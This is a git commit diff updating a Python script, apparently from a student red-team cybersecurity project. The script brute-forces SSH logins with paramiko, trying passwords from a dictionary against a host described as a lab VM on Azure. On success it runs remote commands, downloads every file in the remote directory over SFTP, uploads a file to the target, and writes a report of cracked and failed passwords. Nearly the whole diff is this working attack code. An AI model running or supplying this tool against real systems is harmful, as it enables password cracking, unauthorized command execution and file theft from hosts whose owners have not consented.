0bb04dabb4e060e22aca1eb53cacb7887dafe32b
Juan Viquez <jviquez027@gmail.com>
2025-08-21 07:05:43 -0600

    Update ssh_brute.py

--- proyecto_ciberseguridad/red_team/ssh_brute.py
+++ proyecto_ciberseguridad/red_team/ssh_brute.py
@@ -3,7 +3,6 @@ from datetime import datetime
 import os
 import paramiko
 import shutil
-import time
 
 
 DICT_CLAVES = "dict.txt"
@@ -24,7 +23,7 @@ def cargar_dict():
     Retorna:
         claves: Lista con las posibles contraseñas
     """
-    ruta_dict = RUTA_LOCAL+"/"+DICT_CLAVES
+    ruta_dict = os.path.join(RUTA_LOCAL,DICT_CLAVES)
     claves = [] # Lista de contraseñas
     try:
         with open(ruta_dict, "r") as archivo:
@@ -44,72 +43,84 @@ def fuerza_bruta_ssh(lista_claves):
         host: IP del equipo objetivo
         port: Uso del puerto 22
         username: Usuario en VM Azure, creado para la prueba "labssh"
+    Retorna:
+        dict_salidas: Diccionario con la salida de cada comando
+        reporte_ssh: Reporte de informacion de autenticacion
+        repo_sftp: Reporte de informacion de conexion sftp
     """
     # Valida que se cargaran las contraseñas correctamente
     if lista_claves == None:
         print("No se ha cargado el diccionario")
         return
     
-    reporte_ssh = "----- Detalles de Ataque de Diccinario -----"
-    intentos = 0
+    reporte_fallidos = "----- Info de Intentos Fallidos -----\n\n"
+
+    reporte_ssh = "----- Info de Ataque de Diccinario -----\n\n"
+    
+    intentos = 0 # Intentos de autenticacion fallidos
         
     # Se incia una instancia SSH
     cliente_ssh = paramiko.SSHClient()
     cliente_ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
 
+    print(f"\n=== Iniciando ataque de Brute Force en SSH ===\n")
     # Recorre cada contraseña de la lista
     for clave in lista_claves:
         try:
-            print(f"\nProbando contraseña: {clave}")
+            print(f"Probando contraseña: {clave}")
             # Intenta establecer la conexion 
             cliente_ssh.connect(HOST, port=22, username=USUARIO, password=str(clave), look_for_keys=False, allow_agent=False)
-            print("Autenticación exitosa!\n\n")
-            print(f"[+] Conexión establecida hacia {HOST}......\n")
-            print("-" * 40)
+            print("--- Autenticación exitosa! ---\n")
+            print(f"[+] Conexión establecida hacia {HOST}\n")
+            print("-" * 70)
 
             reporte_ssh += (
-                f"Inicio de conexión SSH: {datetime.now()}\n"
                 f"Conexión establecida con el Host: {HOST}\n"
                 f"Usuario: {USUARIO}\n"
-                f"Contraseña: {clave}\n"
-                f"Cantidad de intentos fallidos: {intentos}\n\n"
+                f"Contraseña: {clave}\n\n"
                 )
-
-            # Lista de comandos para ejecutar dentro de la conexion SSH
-#            lista_comandos = ["ls -lha",
-#                              "ls",
-#                              "cat dict.txt",
-#                              ]
             
-            print(f"Ejecutando los comandos: {COMANDOS}")
+            print(
+                "\n=== Iniciando Ejecución de comandos ===\n"
+                f"\nLista de comandos: {COMANDOS}\n")
 
             dict_salidas = {} # Dict con la respuesta al comando (correcta o error)
 
             for comando in COMANDOS:
                 try:
+                    print(f"Ejecutando el comando {comando}")
                     # Se corre cada comando en la lista (.exec_command)
                     stdin, stdout, stderr = cliente_ssh.exec_command(f"{comando}")
                     resp_ok = stdout.read().decode() # salida OK
                     resp_error = stderr.read().decode() # salida error
 
+                    # Dict con las salidas para cada comando
                     dict_salidas[comando] = [resp_ok, resp_error]
 
+                    print("[+] Ejecución exitosa\n")
+
                 except Exception as e:
-                    error = f"Error al ejecutar el comando '{comando}': {e}\n"
+                    error = f"[!] Error al ejecutar el comando '{comando}': {e}\n"
                     print(error)
                     dict_salidas[comando] = [error]
 
+            print("-" * 70)
+            print("\n=== Iniciando conexión SFTP ===\n")
             # Se ejecuta la transferencia de archivos hacia ambos lados
             repo_sftp = transferir_archivos(cliente_ssh)
 
             # Se cierra la sesion
             cliente_ssh.close()
-            reporte_ssh += f"Cierre de conexión SSH: {datetime.now()}\n"
+
+            reporte_ssh += (f"Cantidad de intentos fallidos: {intentos}\n"
+                            f"{reporte_fallidos}")
             
             return dict_salidas, reporte_ssh, repo_sftp 
 
         except paramiko.AuthenticationException:
-            print(f"Intento de autenticación fallido.\n")
+            fallido = "Intento de autenticación fallido.\n"
+            print(fallido)
+            reporte_fallidos += (f"Usuario: {USUARIO} >>> Contraseña: {clave} || {fallido}")
             intentos += 1
         except Exception as e:
             print(f"Error: {e}\n")
@@ -122,15 +133,18 @@ def transferir_archivos(conexion_ssh):
     Arg:
         conexion_ssh: Conexion SSH ya establecida
     Retorna:
-        xxx
+        reporte_sftp: Reporte con infomación de la transferencia de archivos
     """
-
     reporte_sftp = ("-----Información de conexión SFTP-----\n\n")
+
+    
 
     try:
         cliente_sftp = conexion_ssh.open_sftp() # Se inicia la conexion sftp
-        lista_archivos = cliente_sftp.listdir() # Se listan los archivos en el dir actual
 
+        print(">> Realizando busqueda de archivos.\n")
+        lista_archivos = cliente_sftp.listdir() # Se listan los archivos en el dir actual
+        
         reporte_sftp += (f"Inicio de conexión SFTP: {datetime.now()}\n")
 
         if lista_archivos:
@@ -138,36 +152,42 @@ def transferir_archivos(conexion_ssh):
             # Se valida o crea la ruta para guardar archivos extraidos del objetivo
             os.makedirs(ruta_repo_ssh, exist_ok=True)
 
+            cant_archivos = len(lista_archivos)
+
             reporte_sftp += (
                 "---Detalle de descarga de archivos---\n"
-                f"Cantidad de archivos: {len(lista_archivos)}\n"
+                f"Cantidad de archivos: {cant_archivos}\n"
                 )
-            print("\nArchivos encontrados... Descagando...\n")
-
-            cant_descargados = 0
+            print(
+                f"[+] {cant_archivos} archivos encontrados.\n\n"
+                "=== Iniciando transferencia de archivos ===\n"
+                )
+            cant_descargados = 0 # Contador de archivos descargados
             for archivo in lista_archivos:
                 try:
                     # Se extrae copia de cada archivo del directorio actual hacia nuestro equipo
                     cliente_sftp.get(archivo, ruta_repo_ssh+"/"+archivo)
-                    descarga = f"Archivo: {archivo} descargado.\n"
+                    descarga = f"[+] Archivo: {archivo} descargado."
                     print(descarga)
                     reporte_sftp += descarga
                     cant_descargados += 1
                 except:
-                    error_des = f"\nError al descargar el archivo: {archivo}\n"
+                    error_des = f"[!] Error al descargar el archivo: {archivo}"
                     print(error_des)
                     reporte_sftp += error_des
-            print("-" * 40)
+            print(f"\n{"-" * 70}\n")
 
-        print("Subiendo archivo local.....\n")
+        print(">> Subiendo archivo local\n")
         reporte_sftp += ("---Detalle de subida de archivos---\n")
+
+        ruta_archivo = os.path.join(RUTA_LOCAL,DICT_CLAVES)
         try:
             # Se envia un archivo local al host objetivo
-            cliente_sftp.put(RUTA_LOCAL+"/dict.txt", "/home/labssh/dict.txt")
-            print("Archivo subido con exito\n")
+            cliente_sftp.put(ruta_archivo, "/home/labssh/dict.txt")
+            print("[+] Archivo subido con exito\n")
             reporte_sftp += (f"Archivo subido: dict.txt\n")
         except:
-            error_sub = f"Error al subir el archivo local\n"
+            error_sub = f"[!] Error al subir el archivo local\n"
             print(error_sub)
             reporte_sftp += error_sub
         
@@ -178,9 +198,10 @@ def transferir_archivos(conexion_ssh):
         return reporte_sftp
 
     except Exception as e:
-        error_sftp = f"Error al establecer la conexion sftp: {e}"
+        error_sftp = f"Error al establecer la conexion sftp: {e}\n"
         print(error_sftp)
         reporte_sftp += error_sftp
+        cliente_sftp.close()    
 
 
 def obtener_fecha_hora():
@@ -201,19 +222,24 @@ def guardar_reporte(dict_comm, ssh_repo, sftp_repo):
 
     try:
         print("-" * 70)
-        print("\nGenerando reporte de Brute Force.....\n")
+        print("\n=== Generando reporte de Brute Force ===\n")
         timestamp = obtener_fecha_hora()
         
         # Se definen los nombres de los reportes segun el timestamp
         nombre_reporte = f"reporte_ssh_brute_{timestamp}.txt"
 
         with open(nombre_reporte, "w", encoding="utf-8") as archivo:
-            archivo.write(f"=== REPORTE DE BRUTE FORCE - ({timestamp}) ===\n\n")
-            archivo.write(ssh_repo)
+            archivo.write(
+                f"=== REPORTE DE BRUTE FORCE - ({timestamp}) ===\n\n"
+                f"{ssh_repo}"
+                f"\n\n---Detalles de ejecucion de comandos---\n")
+            
             for comm, salidas in dict_comm.items():
-                archivo.write(f"Comando: {comm}\n"
-                              f"Salida OK: {salidas[0]}\n"
-                              f"Salida Error: {salidas[1]}\n")
+                archivo.write(
+                    f"Comando: {comm}\n"
+                    f"Salida OK: {salidas[0]}\n"
+                    f"Salida Error: {salidas[1]}\n\n")
+            archivo.write(sftp_repo)
 
         # Valida que exista o crea la ruta "Reportes_Red_Team/Reportes_Packet_Attack"
         os.makedirs("Reportes_Red_Team/Reporte_SSH_Brute", exist_ok=True)
@@ -224,7 +250,7 @@ def guardar_reporte(dict_comm, ssh_repo, sftp_repo):
         # Mueve el archivo al directorio Reporte_SSH_Brute
         shutil.move(nombre_reporte, ruta_completa)
         
-        print("[+] Reporte guardado en: RReportes_Red_Team/Reporte_SSH_Brute/\n")
+        print("[+] Reporte guardado en: Reportes_Red_Team/Reporte_SSH_Brute/\n")
     except OSError as e:
         print(f"[!] Error guardando reporte: {e}\n")
     print("-" * 70)
@@ -233,3 +259,4 @@ def guardar_reporte(dict_comm, ssh_repo, sftp_repo):
 if __name__ == "__main__":
     lista_claves = cargar_dict()
     dict, ssh, sftp = fuerza_bruta_ssh(lista_claves)
+    guardar_reporte(dict, ssh, sftp)
